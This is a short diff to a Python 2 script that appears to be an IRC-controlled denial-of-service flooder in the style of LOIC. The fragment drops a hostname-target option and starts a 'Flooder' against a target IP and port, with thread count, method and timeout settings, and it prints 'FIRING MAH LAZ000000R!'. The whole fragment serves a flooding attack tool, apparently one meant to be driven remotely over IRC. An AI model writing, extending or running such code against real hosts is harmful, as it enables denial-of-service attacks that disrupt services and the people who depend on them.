@@ -121,13 +121,13 @@ def lazerParseHook(event):
         status = WAITING
 
 def lazerStartHook(event):
-    global status, flooder, targetip, targethost, timeout, subsite, message, port, method, threads, wait, random, speed
+    global status, flooder, targetip, timeout, subsite, message, port, method, threads, wait, random, speed
     print "FIRING MAH LAZ000000R!"
     if status == START:
         if flooder != None:
             flooder.stop()
 
-        if (targetip == None and targethost == None) or port == None:
+        if targetip == None or port == None:
             print "no target set"
             return
 
@@ -141,13 +141,7 @@ def lazerStartHook(event):
             print "Missing required thread amount"
             return
 
-        host = None
-        if targetip == None:
-            host = targethost
-        else:
-            host = targetip
-
-        flooder = Flooder(host, port, timeout, method, threads, subsite, message, random, wait, srchost, srcport)
+        flooder = Flooder(targetip, port, timeout, method, threads, subsite, message, random, wait, srchost, srcport)
         flooder.start()
 
 irc = None
